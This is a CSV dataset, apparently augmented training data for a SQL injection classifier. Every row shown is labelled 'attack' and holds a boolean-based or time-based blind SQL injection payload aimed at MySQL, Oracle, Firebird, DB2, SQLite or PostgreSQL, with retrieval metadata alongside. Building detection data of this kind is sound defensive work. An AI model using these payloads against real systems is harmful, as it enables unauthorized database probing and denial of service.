id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000271,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000690,0.36646523287507865
SMOTE_000272,attack,boolean,1   )    )     )   and 8990  =  4775 and    (    (     (  1894  =  1894,nearest_attack_euclidean,R000473,0.4166096040507195
SMOTE_000273,attack,boolean,1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',nearest_attack_euclidean,R000147,1.9982161769339575
SMOTE_000274,attack,boolean,-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',nearest_attack_euclidean,R000481,0.8543716861818759
SMOTE_000275,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000603,0.2043201533126342
SMOTE_000276,attack,boolean,"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'aumk' like 'aumk",nearest_attack_euclidean,R000503,0.11746778395379553
SMOTE_000277,attack,boolean,"1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000352,1.3615180013130375
SMOTE_000278,attack,boolean,"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000425,0.0575264567661162
SMOTE_000279,attack,boolean,"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",nearest_attack_euclidean,R000435,0.37803753882822144
SMOTE_000280,attack,boolean,-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--,nearest_attack_euclidean,R000439,0.020778215015067762
SMOTE_000281,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",nearest_attack_euclidean,R000038,0.8443010223304068
SMOTE_000282,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000162,0.27601133776216813
SMOTE_000283,attack,boolean,"1  )   as ihan where 5298  =  5298 and elt  (  6587  =  3479,3479  )  --",nearest_attack_euclidean,R000375,0.13428834975059936
SMOTE_000284,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000443,0.470683844026951
SMOTE_000285,attack,boolean,"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",nearest_attack_euclidean,R000505,0.5541586429840081
SMOTE_000286,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000716,0.5953645525654698
SMOTE_000287,attack,boolean,"1""  )   as dfmm where 7563  =  7563 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000550,1.0724321284933052
SMOTE_000288,attack,boolean,"1  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000696,0.17206533808930305
SMOTE_000289,attack,boolean,"1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000138,0.38880818917606563
SMOTE_000290,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000174,0.34601323576236304
SMOTE_000291,attack,boolean,1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,nearest_attack_euclidean,R000294,0.5080851354660304
SMOTE_000292,attack,boolean,"1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000352,0.5326950017523996
SMOTE_000293,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '",nearest_attack_euclidean,R000076,0.4100544476390841
SMOTE_000294,attack,boolean,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000015,0.5837198927593442
SMOTE_000295,attack,boolean,"1  )   as kjsd where 1670  =  1670 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000679,0.23611105366115334
SMOTE_000296,attack,boolean,"1%""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000614,1.5616314472509607
SMOTE_000297,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",nearest_attack_euclidean,R000135,0.23741101009017976
SMOTE_000298,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""mubt""  =  ""mubt",nearest_attack_euclidean,R000202,0.3408282424374138
SMOTE_000299,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",nearest_attack_euclidean,R000779,0.35157873035108905
SMOTE_000300,attack,boolean,"1' where 9420  =  9420 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000338,0.38740665698615684
SMOTE_000301,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000635,0.14733350330772982
SMOTE_000302,attack,boolean,"1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000152,0.01826703074435642
SMOTE_000303,attack,boolean,"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000345,0.3240468609426093
SMOTE_000304,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000329,1.5693338010624869
SMOTE_000305,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",nearest_attack_euclidean,R000431,0.6329842171123802
SMOTE_000306,attack,boolean,"1' where 9420  =  9420 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000338,0.95404840253704
SMOTE_000307,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""eboa"" like ""eboa",nearest_attack_euclidean,R000777,0.2284241809828742
SMOTE_000308,attack,boolean,"1'  )   as ssxj where 3845  =  3845 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000632,0.5382393119588685
SMOTE_000309,attack,boolean,-1648   )    )    as oqqy where 3459  =  3459 or 6872  =  6872--,nearest_attack_euclidean,R000212,0.31215692410370305
SMOTE_000310,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",nearest_attack_euclidean,R000038,0.6762215277430318
SMOTE_000311,attack,boolean,"1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'",nearest_attack_euclidean,R000498,0.025619284699425156
SMOTE_000312,attack,boolean,"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000113,0.22873020509322983
SMOTE_000313,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000089,0.337094746877711
SMOTE_000314,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000267,0.5444193594045277
SMOTE_000315,attack,boolean,"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'dphz'  =  'dphz",nearest_attack_euclidean,R000398,0.5160947346472766
SMOTE_000316,attack,boolean," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000016,0.0
SMOTE_000317,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000191,0.2558147584148517
SMOTE_000318,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000289,0.010021866725432697
SMOTE_000319,attack,boolean,"1' in boolean mode  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000278,0.6776838972481016
SMOTE_000320,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",nearest_attack_euclidean,R000302,0.4054495590143613
SMOTE_000321,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R000772,1.4885819987451678
SMOTE_000322,attack,boolean,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",nearest_attack_euclidean,R000123,0.5840211444468222
SMOTE_000323,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000646,0.030454861994647253
SMOTE_000324,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000741,0.3878124154919919
SMOTE_000325,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000667,0.15926306296975928
SMOTE_000326,attack,boolean,"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ksxz""  =  ""ksxz",nearest_attack_euclidean,R000718,0.8326216800178228
SMOTE_000327,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'pfal'  =  'pfal,nearest_attack_euclidean,R000587,0.27044970034166804
SMOTE_000328,attack,boolean,"1'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000286,0.761558221187696
SMOTE_000329,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000589,0.09866595547357995
SMOTE_000330,attack,boolean,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",nearest_attack_euclidean,R000123,0.8388781299909185
SMOTE_000331,attack,boolean,1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,nearest_attack_euclidean,R000518,0.0020068512491948063
SMOTE_000332,attack,boolean,"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ksxz""  =  ""ksxz",nearest_attack_euclidean,R000718,0.244976591525848
SMOTE_000333,attack,boolean,"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000732,0.42941376487737415
SMOTE_000334,attack,boolean,select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000017,1.5667493463079876
SMOTE_000335,attack,boolean,"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000469,0.4774770051739719
SMOTE_000336,attack,boolean,1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#,nearest_attack_euclidean,R000683,1.06953006827876
SMOTE_000337,attack,boolean,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",nearest_attack_euclidean,R000544,0.38336351306610406
SMOTE_000338,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000173,0.5437123549345758
SMOTE_000339,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000362,0.23601853126284159
SMOTE_000340,attack,boolean,"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw",nearest_attack_euclidean,R000386,0.27156177060840814
SMOTE_000341,attack,boolean,"1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000138,0.4030608269217151
SMOTE_000342,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'  =  '",nearest_attack_euclidean,R000706,0.4516376304658578
SMOTE_000343,attack,boolean,"1'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000286,1.3027217085223983
SMOTE_000344,attack,boolean,"-5904"" where 9782  =  9782 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",nearest_attack_euclidean,R000347,0.09765573572697679
SMOTE_000345,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ctdc""  =  ""ctdc",nearest_attack_euclidean,R000341,1.3310083081766027
SMOTE_000346,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",nearest_attack_euclidean,R000382,0.07311336485964937
SMOTE_000347,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",nearest_attack_euclidean,R000038,0.45921043025013414
SMOTE_000348,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000303,0.2172648825106173
SMOTE_000349,attack,boolean,1   )    )     )   and 8990  =  4775 and    (    (     (  1894  =  1894,nearest_attack_euclidean,R000473,1.3012567030520978
SMOTE_000350,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""ejmj"" like ""ejmj",nearest_attack_euclidean,R000468,0.0041490970508989665
SMOTE_000351,attack,boolean,"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000229,0.39948983859824605
SMOTE_000352,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000489,0.14817685508589
SMOTE_000353,attack,boolean,"-7469  )   where 5875  =  5875 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000206,0.003971434721880786
SMOTE_000354,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr",nearest_attack_euclidean,R000691,0.6546218128630474
SMOTE_000355,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  8535  =  8535",nearest_attack_euclidean,R000713,0.3937196957991476
SMOTE_000356,attack,boolean,1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',nearest_attack_euclidean,R000147,0.9944725857354263
SMOTE_000357,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000013,0.10632856826357842
SMOTE_000358,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000612,0.3497278815946064
SMOTE_000359,attack,boolean,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,nearest_attack_euclidean,R000036,0.7219938422813255
SMOTE_000360,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000033,0.6208184413233341
SMOTE_000361,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000032,1.206635672588298
SMOTE_000362,attack,boolean,-4389'   )    )     )   or   (  1139  =  3499  )  *3499 and    (    (     (  'qoch'  =  'qoch,nearest_attack_euclidean,R000753,0.478502472099276
SMOTE_000363,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000148,1.8140032852954366
SMOTE_000364,attack,boolean,-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000770,0.2537781276233027
SMOTE_000365,attack,boolean,"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",nearest_attack_euclidean,R000582,0.480862385997181
SMOTE_000366,attack,boolean,1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,nearest_attack_euclidean,R000268,0.3320019030500724
SMOTE_000367,attack,boolean,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000414,0.2631861253214226
SMOTE_000368,attack,boolean,"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000618,0.29830012777763226
SMOTE_000369,attack,boolean,"1'   )    )    as anaq where 9605  =  9605 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000607,0.3831283487526416
SMOTE_000370,attack,boolean,-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq,nearest_attack_euclidean,R000561,0.5037822061942939
SMOTE_000371,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'ybjo'  =  'ybjo",nearest_attack_euclidean,R000350,0.32688838218537997
SMOTE_000372,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000419,0.4352594893589047
SMOTE_000373,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000557,0.6622472774373326
SMOTE_000374,attack,boolean,"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000265,0.10033853843385454
SMOTE_000375,attack,boolean,"1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000022,0.030549190068840718
SMOTE_000376,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000130,0.8721502831121185
SMOTE_000377,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000006,0.8067020904744768
SMOTE_000378,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000234,0.026948774268743474
SMOTE_000379,attack,boolean,"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely",nearest_attack_euclidean,R000153,0.7379902725712405
SMOTE_000380,attack,boolean,"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000517,1.3478828036605282
SMOTE_000381,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000625,0.0480033000721138
SMOTE_000382,attack,boolean,"1   )    )    as oqfr where 6426  =  6426 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000205,0.6535944385411228
SMOTE_000383,attack,boolean,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'tkcy' like 'tkcy",nearest_attack_euclidean,R000528,0.802149913004996
SMOTE_000384,attack,boolean,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied",nearest_attack_euclidean,R000417,0.08834304656250389
SMOTE_000385,attack,boolean,"1%"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000689,0.08741484898966237
SMOTE_000386,attack,boolean,"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv",nearest_attack_euclidean,R000630,0.7194789627739123
SMOTE_000387,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000557,0.7543137752273367
SMOTE_000388,attack,boolean,"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000229,0.25669958348398597
SMOTE_000389,attack,boolean,"1  )   where 2720  =  2720 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000404,0.6156732521032663
SMOTE_000390,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000066,1.1593748982056238
SMOTE_000391,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000208,0.7627304715836613
SMOTE_000392,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",nearest_attack_euclidean,R000136,0.4176404964364172
SMOTE_000393,attack,boolean,"1""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000600,0.46308393786294844
SMOTE_000394,attack,boolean,"-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr",nearest_attack_euclidean,R000324,0.5002994555973718
SMOTE_000395,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R000730,0.3276078344852987
SMOTE_000396,attack,boolean,-6712'   )    )    as kqff where 9146  =  9146 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000232,1.0621276355407614
SMOTE_000397,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'trzi'  =  'trzi,nearest_attack_euclidean,R000591,0.06213753920488113
SMOTE_000398,attack,boolean,-6341' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'ugys'  =  'ugys,nearest_attack_euclidean,R000725,0.911314142024152
SMOTE_000399,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000041,0.5935448897283442
SMOTE_000400,attack,boolean,"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000263,0.07701646013017889
SMOTE_000401,attack,boolean,"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000749,0.38892977919838984
SMOTE_000402,attack,boolean,1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,nearest_attack_euclidean,R000359,1.551788326859028
SMOTE_000403,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'knbx' like 'knbx",nearest_attack_euclidean,R000677,0.23517811653291085
SMOTE_000404,attack,boolean,"1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000240,0.16489617653749367
SMOTE_000405,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000207,0.43035670237625784
SMOTE_000406,attack,boolean,"1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000415,0.7044397732519322
SMOTE_000407,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""mofa"" like ""mofa",nearest_attack_euclidean,R000504,0.5633172192464955
SMOTE_000408,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",nearest_attack_euclidean,R000302,0.1855832178776311
